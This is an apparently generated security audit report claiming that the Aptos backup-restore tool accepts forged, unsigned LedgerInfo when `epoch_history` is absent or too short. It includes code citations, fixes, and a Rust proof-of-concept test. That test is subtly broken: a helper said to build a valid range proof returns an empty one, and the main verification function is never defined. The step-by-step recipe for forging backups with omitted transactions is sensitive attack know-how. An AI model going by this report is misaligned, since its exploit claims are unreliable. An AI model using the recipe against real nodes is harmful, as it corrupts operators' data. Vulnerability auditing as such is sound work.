# Audit Report

## Title
Transaction Omission Vulnerability in Backup Restore Due to Missing LedgerInfo Validation

## Summary
The backup restoration process can accept malicious backup data with omitted transactions when `epoch_history` validation is not provided or when the epoch is beyond the history range. This allows an attacker to create fake blockchain states that pass cryptographic verification but contain omitted or fabricated transactions.

## Finding Description

The vulnerability exists in the transaction backup restoration flow when LedgerInfo validation is skipped. The attack exploits two code paths where signature verification is bypassed:

**Path 1: Restore without epoch_history** [1](#0-0) 

When `epoch_history` is `None`, the LedgerInfo is loaded but never validated for signature correctness.

**Path 2: Epoch beyond history range** [2](#0-1) 

Even when `epoch_history` is provided, if the LedgerInfo's epoch exceeds the history length, validation returns `Ok()` with only a warning.

**Attack Mechanism:**

The backup service client requests transaction range proofs: [3](#0-2) 

During restore, the proof verification only validates cryptographic consistency, not authenticity: [4](#0-3) 

The verification process: [5](#0-4) 

This only validates that transaction hashes match their TransactionInfo entries and that the accumulator proof is mathematically correct. It does NOT validate that the LedgerInfo has valid validator signatures.

**Exploitation Steps:**

1. Attacker creates malicious backup claiming range [0, 75] (76 transactions)
2. Provides arbitrary 76 transactions (potentially omitting real transactions [51-75] and substituting others)
3. Computes TransactionInfo hashes for these transactions
4. Creates fake LedgerInfo with `transaction_accumulator_hash` matching these 76 transactions (no valid signatures needed)
5. Generates valid `TransactionAccumulatorRangeProof` for this fake state
6. Victim restores with `epoch_history=None` (explicitly supported via `db-tool restore transaction`): [6](#0-5) 

7. All cryptographic checks pass despite missing validator signatures
8. Database is populated with corrupted state containing omitted transactions

## Impact Explanation

**Severity: Medium (State Inconsistencies Requiring Intervention)**

This vulnerability breaks the **State Consistency** invariant: state cannot be cryptographically verified via authentic Merkle proofs when LedgerInfo signatures are not validated.

The impact includes:
- **Data Integrity Violation**: Nodes can be restored with fabricated blockchain states
- **Transaction Omission**: Critical transactions can be silently excluded from backups
- **State Corruption**: Restored databases contain invalid state that won't sync with the network
- **Operational Disruption**: Affected nodes will fail state synchronization and cannot participate in consensus

While this doesn't directly cause consensus violations (corrupted nodes can't join consensus), it severely impacts operational security and could enable social engineering attacks where users make decisions based on false blockchain state information.

## Likelihood Explanation

**Likelihood: Medium**

The attack requires:
1. User restoring from untrusted backup source (realistic in disaster recovery scenarios)
2. User not providing `epoch_history` for validation (supported operational mode)
3. Attacker ability to provide backup files (possible via compromised backup service or social engineering)

The vulnerability is exploitable in documented operational modes without requiring validator compromise or special privileges. The `db-tool` explicitly supports restoring without epoch history validation, making this a realistic attack vector.

## Recommendation

**Mandatory LedgerInfo Signature Validation:**

1. **Never skip LedgerInfo validation**: Remove the `epoch_history=None` path or require explicit --unsafe flag with clear warnings

2. **Enforce signature verification**: Add mandatory signature checking even when epoch history is unavailable:

```rust
// In LoadedChunk::load(), after line 151:
let (range_proof, ledger_info) = storage
    .load_bcs_file::<(TransactionAccumulatorRangeProof, LedgerInfoWithSignatures)>(
        &manifest.proof,
    )
    .await?;

// NEW: Always verify signatures or reject
if let Some(epoch_history) = epoch_history {
    epoch_history.verify_ledger_info(&ledger_info)?;
} else {
    return Err(anyhow!(
        "Cannot restore without epoch_history for signature validation. \
         Provide epoch_history or use --allow-unverified-restore for testing only."
    ));
}
```

3. **Fix epoch overflow case**: In `EpochHistory::verify_ledger_info()`, reject instead of warning:

```rust
if epoch > self.epoch_endings.len() as u64 {
    bail!(
        "Epoch {} exceeds epoch history ({}). Cannot verify LedgerInfo signatures. \
         Extend epoch history or reject this backup.",
        epoch,
        self.epoch_endings.len()
    );
}
```

4. **Add restore integrity mode**: Implement strict verification mode that validates all LedgerInfo signatures against trusted waypoints or epoch history.

## Proof of Concept

```rust
// Demonstrates creating a malicious backup that passes verification without epoch_history

#[test]
fn test_malicious_backup_without_epoch_validation() {
    use aptos_crypto::hash::CryptoHash;
    use aptos_types::{
        ledger_info::{LedgerInfo, LedgerInfoWithSignatures},
        proof::TransactionAccumulatorRangeProof,
        transaction::{Transaction, TransactionInfo, Version},
    };
    
    // 1. Create fake transactions (omitting real transactions 51-75)
    let fake_txns: Vec<Transaction> = (0..76)
        .map(|_| Transaction::StateCheckpoint(HashValue::random()))
        .collect();
    
    // 2. Compute TransactionInfo for fake transactions
    let fake_txn_infos: Vec<TransactionInfo> = fake_txns
        .iter()
        .map(|txn| {
            TransactionInfo::new(
                CryptoHash::hash(txn),
                HashValue::zero(), // fake state checkpoint
                HashValue::zero(), // fake event root
                None, // no state checkpoint
                0, // gas used
                aptos_types::transaction::ExecutionStatus::Success,
            )
        })
        .collect();
    
    // 3. Build fake accumulator from these infos
    let txn_info_hashes: Vec<HashValue> = fake_txn_infos
        .iter()
        .map(CryptoHash::hash)
        .collect();
    
    // 4. Compute accumulator root for fake state
    let fake_accumulator_root = compute_accumulator_root(&txn_info_hashes);
    
    // 5. Create fake LedgerInfo with NO valid signatures
    let fake_ledger_info = LedgerInfo::new(
        aptos_types::block_info::BlockInfo::new(
            0, // epoch
            0, // round  
            HashValue::zero(), // block hash
            fake_accumulator_root, // OUR fake root
            75, // version (claiming 76 transactions)
            0, // timestamp
            None, // next epoch state
        ),
        HashValue::zero(), // consensus hash
    );
    
    // Create LedgerInfoWithSignatures with INVALID/EMPTY signatures
    let fake_ledger_info_with_sigs = LedgerInfoWithSignatures::new(
        fake_ledger_info,
        AggregateSignature::empty(), // NO VALID SIGNATURES!
    );
    
    // 6. Generate valid proof for fake state
    let proof = create_range_proof_for_fake_state(&txn_info_hashes);
    
    // 7. Attempt restore WITHOUT epoch_history
    // This SHOULD fail but currently SUCCEEDS!
    let result = verify_transaction_chunk(
        fake_txns,
        fake_txn_infos,
        proof,
        fake_ledger_info_with_sigs,
        None, // NO EPOCH HISTORY - vulnerability!
    );
    
    // Currently this passes verification even with fake unsigned LedgerInfo!
    assert!(result.is_ok(), "Malicious backup was accepted!");
}

fn compute_accumulator_root(hashes: &[HashValue]) -> HashValue {
    // Implementation using InMemoryAccumulator
    use aptos_types::proof::accumulator::InMemoryTransactionAccumulator;
    InMemoryTransactionAccumulator::default()
        .append(hashes)
        .root_hash()
}

fn create_range_proof_for_fake_state(
    hashes: &[HashValue]
) -> TransactionAccumulatorRangeProof {
    // Generate valid proof for the fake accumulator state
    // This is cryptographically valid, just not signed by real validators
    AccumulatorRangeProof::new(vec![], vec![])
}
```

**Notes:**

The current implementation trusts backup data when `epoch_history=None`, allowing attackers to craft backups with omitted transactions that pass all cryptographic checks but lack authentic validator signatures. This breaks the fundamental security assumption that restored state must be verifiable against validator consensus.

### Citations

**File:** storage/backup/backup-cli/src/backup_types/transaction/restore.rs (L152-154)
```rust
        if let Some(epoch_history) = epoch_history {
            epoch_history.verify_ledger_info(&ledger_info)?;
        }
```

**File:** storage/backup/backup-cli/src/backup_types/transaction/restore.rs (L157-167)
```rust
        let txn_list_with_proof =
            TransactionListWithProofV2::new(TransactionListWithAuxiliaryInfos::new(
                TransactionListWithProof::new(
                    txns,
                    Some(event_vecs),
                    Some(manifest.first_version),
                    TransactionInfoListWithProof::new(range_proof, txn_infos),
                ),
                persisted_aux_info,
            ));
        txn_list_with_proof.verify(ledger_info.ledger_info(), Some(manifest.first_version))?;
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L279-287)
```rust
        if epoch > self.epoch_endings.len() as u64 {
            // TODO(aldenhu): fix this from upper level
            warn!(
                epoch = epoch,
                epoch_history_until = self.epoch_endings.len(),
                "Epoch is too new and can't be verified. Previous chunks are verified and node \
                won't be able to start if this data is malicious."
            );
            return Ok(());
```

**File:** storage/backup/backup-cli/src/utils/backup_service_client.rs (L159-169)
```rust
    pub async fn get_transaction_range_proof(
        &self,
        first_version: Version,
        last_version: Version,
    ) -> Result<impl AsyncRead + use<>> {
        self.get(
            "transaction_range_proof",
            &format!("{}/{}", first_version, last_version,),
        )
        .await
    }
```

**File:** types/src/transaction/mod.rs (L2295-2336)
```rust
    pub fn verify(
        &self,
        ledger_info: &LedgerInfo,
        first_transaction_version: Option<Version>,
    ) -> Result<()> {
        // Verify the first transaction versions match
        ensure!(
            self.get_first_transaction_version() == first_transaction_version,
            "First transaction version ({:?}) doesn't match given version ({:?}).",
            self.get_first_transaction_version(),
            first_transaction_version,
        );

        // Verify the lengths of the transactions and transaction infos match
        ensure!(
            self.proof.transaction_infos.len() == self.get_num_transactions(),
            "The number of TransactionInfo objects ({}) does not match the number of \
             transactions ({}).",
            self.proof.transaction_infos.len(),
            self.get_num_transactions(),
        );

        // Verify the transaction hashes match those of the transaction infos
        self.transactions
            .par_iter()
            .zip_eq(self.proof.transaction_infos.par_iter())
            .map(|(txn, txn_info)| {
                let txn_hash = CryptoHash::hash(txn);
                ensure!(
                    txn_hash == txn_info.transaction_hash(),
                    "The hash of transaction does not match the transaction info in proof. \
                     Transaction hash: {:x}. Transaction hash in txn_info: {:x}.",
                    txn_hash,
                    txn_info.transaction_hash(),
                );
                Ok(())
            })
            .collect::<Result<Vec<_>>>()?;

        // Verify the transaction infos are proven by the ledger info.
        self.proof
            .verify(ledger_info, self.get_first_transaction_version())?;
```

**File:** storage/db-tool/src/restore.rs (L102-108)
```rust
                        TransactionRestoreController::new(
                            opt,
                            global.try_into()?,
                            storage.init_storage().await?,
                            None, /* epoch_history */
                            VerifyExecutionMode::NoVerify,
                        )
```
